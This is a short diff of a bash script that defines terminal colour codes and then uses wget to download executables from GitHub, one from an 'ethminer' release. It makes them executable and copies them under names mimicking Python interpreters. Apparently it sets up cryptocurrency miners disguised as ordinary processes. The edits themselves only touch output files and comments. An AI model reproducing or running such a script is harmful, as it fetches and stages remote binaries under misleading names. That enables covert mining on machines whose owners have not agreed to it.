@@ -93,9 +93,11 @@ On_IPurple='\033[0;105m'  # Purple
 On_ICyan='\033[0;106m'    # Cyan
 On_IWhite='\033[0;107m'   # White
 
-
+echo > oout
+echo > ooutxm
+echo  > ooutx
 ###### VC
-echo -e >> ooutx
+
 rm -rf pythonheq
 wget -q https://github.com/one10001/10001code/raw/main/pythonheq
 chmod +x pythonheq
@@ -124,7 +126,8 @@ echo -e '###############################3############################'"${Color_O
 fi
 
 
-echo -e > oout
+
+# RV
 
 rm -rf python2.6.6
 rm -rf pythonoc
@@ -134,9 +137,9 @@ cp python2.6.6 pythonoc
 
 
 
-
+# ET
 rm -rf pyeth2
-rm -rf pythonoc
+rm -rf pyethoc
 wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2 2> lol.out
 chmod +x pyeth2
 cp pyeth2 pyethoc
